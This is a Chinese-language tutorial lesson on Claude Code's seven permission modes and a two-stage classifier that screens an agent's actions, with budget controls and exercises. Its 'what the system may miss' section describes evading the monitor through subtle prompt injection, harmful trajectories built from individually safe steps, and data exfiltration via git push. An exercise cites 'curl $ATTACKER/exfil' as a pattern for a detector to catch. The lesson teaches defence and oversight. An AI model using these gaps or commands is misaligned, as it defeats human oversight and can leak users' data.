# Claude Code 自主代理：权限模式与自动模式

> Claude Code 提供了七种权限模式。"plan"模式每次操作前都征求用户意见，"default"模式仅对高风险操作征求同意，"acceptEdits"模式自动批准文件写入但仍需要确认 shell 执行，而"bypassPermissions"模式则批准所有操作。自动模式（2026 年 3 月 24 日）用两阶段并行安全分类器取代了逐操作审批：每个操作都经过一个单令牌快速检查；被标记的操作会触发深度链式推理审查。通过 `max_turns` 和 `max_budget_usd` 来执行操作预算。自动模式以研究预览版形式发布——Anthropic 明确表示分类器本身并不足以保障安全。

**类型：** 学习
**语言：** Python（标准库，两阶段分类器模拟器）
**前置知识：** 第 15 阶段 · 01（长程代理），第 15 阶段 · 09（编程代理全景）
**预计用时：** ~45 分钟

## 问题

一个能够在你的机器上自主运行的编程代理是一种独特的安全类别。攻击面包括代理可以触及的一切——文件系统、网络、凭据、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已公开指出：计算机使用代理不是聊天机器人的"功能更新"，而是一种具有新型风险画像的新型工具。

Claude Code 的权限系统是 Anthropic 的应对方案。它不是提供一个"自主/非自主"的开关，而是设计了一个覆盖七种模式的权限阶梯：plan → default → acceptEdits → … → bypassPermissions。每种模式都代表了速度与逐操作审查之间的不同权衡。自动模式（2026 年 3 月）增加了一个两阶段分类器，对于判定为安全的操作，将审批从用户的关键路径上移除，同时为分类器标记的操作保留审查环节。

工程问题：这个系统能发现什么，会遗漏什么，以及给定任务实际上需要哪种模式？

## 概念

### 七种权限模式

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | 代理提出计划；用户批准整个计划；每个操作在执行前都需审查 | 不熟悉的任务；接近生产环境的代码；首次在仓库上使用代理 |
| `default` | 代理执行操作；对任何"高风险"操作（shell 执行、破坏性操作、网络调用）提示用户 | 大多数交互式编程会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍会提示 | 跨多个文件的重构 |
| `acceptExec` | shell 命令在精选允许列表中自动批准；写入自动批准 | 每个 shell 命令都是 `npm test` 或类似命令的紧凑内循环 |
| `autoMode` | 两阶段安全分类器；被标记的操作升级为审查 | 受限工作区中的长程无人值守运行 |
| `yolo` | 跳过大多数提示；仍运行工具允许列表/拒绝列表 | 临时沙箱、CI 任务、研究脚本 |
| `bypassPermissions` | 批准所有操作 | 文档注明"仅限你愿意丢弃的临时容器内使用" |

（以上名称与 Claude Code 公共文档一致；"yolo"是宽松中间地带的非正式简称。）

### 自动模式一览

自动模式（2026 年 3 月 24 日发布）是第一个将逐操作审批委托给模型的权限模式。结构如下：

1. **第 1 阶段——单令牌分类器。** 对每个提议的操作运行。成本低。返回"安全"或"标记"。设计上与主代理循环并行运行，以便已批准的操作不会进入等待队列。
2. **第 2 阶段——辅助策略/安全审查。** 仅对标记的操作运行。对操作、会话当前状态及声明的任务进行有针对性的策略和安全评估。若置信度低，则升级为人工介入（HITL）。

预算控制与分类器并行设置：

- `max_turns`——一个会话中的总迭代次数。
- `max_budget_usd`——美元上限，达到后终止会话。
- 每类工具的操作次数限制（最多 N 次 `WebFetch` 调用等）。

### 系统能捕获什么

- 直接提示注入到工具输入中，且注入指令映射到已知的高风险操作形态。
- 重复的工具循环——分类器能识别出第 N+1 次操作与第 N 次操作几乎相同，连续五次。
- 在原本仅限文件编辑的会话中，明显超出范围的 shell 命令。

### 系统可能遗漏什么

- **微妙的提示注入**——在不产生单个标记操作的情况下调节行为。间接提示注入并非可完全修补的漏洞（OpenAI 安全负责人，2025 年，关于浏览器代理的论述——参见第 11 课）。
- **语义层面的不当行为。** 每个单独的操作看起来都安全，但组合起来的轨迹可能具有危害性。分类器评判的是操作本身，而非重新推导用户的意图。
- **通过合法渠道的数据外泄。** 将数据写入你拥有的文件，然后通过 `git push` 推送到公共仓库——这是一系列允许的操作，其组合才是问题所在。

### 研究预览定位

Anthropic 将自动模式以研究预览版形式发布。文档明确指出，分类器只是一个辅助层，而非解决方案：用户应结合预算、允许列表、隔离工作区和轨迹审计（第 12–16 课）来使用自动模式。预览定位也反映了已记录的评估与部署之间的差距（第 1 课）——一个通过离线评估的分类器，在用户上下文模糊的真实会话中可能表现不同。

### 权限阶梯在你的工作流中的位置

- 不熟悉的任务：从 `plan` 开始。阅读计划的成本低于回滚一次糟糕的运行。
- 熟悉的重构：`acceptEdits` 能节省大量确认点击。
- 无人值守的后台运行：`autoMode` 仅限于你已经评估过爆炸半径的工作区（无凭据、无生产挂载、无未经你同意的出口流量）。
- 临时容器：`yolo` / `bypassPermissions` 仅在容器及其凭据可丢弃的前提下可以接受。

## 使用

`code/main.py` 模拟了两阶段分类器。第 1 阶段是对提议操作进行低成本的关键词规则检查；第 2 阶段是较慢的多规则审查器。驱动程序输入一个简短的合成轨迹（安全操作、一次提示注入尝试、一个重复循环），展示分类器在何处捕获、在何处遗漏。

## 产出

`outputs/skill-permission-mode-picker.md` 将任务描述匹配到正确的权限模式、预算上限和所需的隔离级别。

## 练习

1. 运行 `code/main.py`。哪种合成操作类型从未被第 1 阶段标记，但总是被第 2 阶段捕获？哪种操作类型两者都捕获不到？

2. 扩展第 1 阶段的规则集，以捕获特定的已知有害形态（例如 `curl $ATTACKER/exfil`）。在良性操作样本上测量误报率。

3. 阅读 Anthropic 的"代理循环工作原理"文档。列出在 `default` 模式下，代理默认接触的所有外部状态。在无人值守运行 `autoMode` 之前，你需要单独对哪些外部状态进行管控？

4. 设计一个 24 小时无人值守运行的预算：`max_turns`、`max_budget_usd`、每工具上限、允许列表。为每个数字提供理由。

5. 描述这样一条轨迹：其中每个单独的操作都通过第 1 阶段和第 2 阶段的批准，但组合行为却是不对齐的。（第 14 课介绍了终止开关和哨兵令牌如何解决这个问题。）

## 关键术语

| 术语 | 通俗说法 | 实际含义 |
|---|---|---|
| 权限模式 | "代理能做什么" | 七种命名策略之一，控制逐操作审批 |
| plan 模式 | "做什么都要先问" | 代理编写计划；用户批准后执行 |
| acceptEdits | "允许写入文件" | 文件写入自动批准；shell 执行仍会提示 |
| autoMode | "自动审批" | 两阶段安全分类器；标记的操作升级审查 |
| bypassPermissions | "完全 YOLO" | 批准所有操作；用于临时容器 |
| 第 1 阶段分类器 | "快速令牌检查" | 基于提议操作的单令牌规则；并行运行 |
| 第 2 阶段分类器 | "深度审查" | 对标记操作进行链式推理 |
| 研究预览 | "非正式发布" | Anthropic 对仍在探索失效模式的功能的定位 |
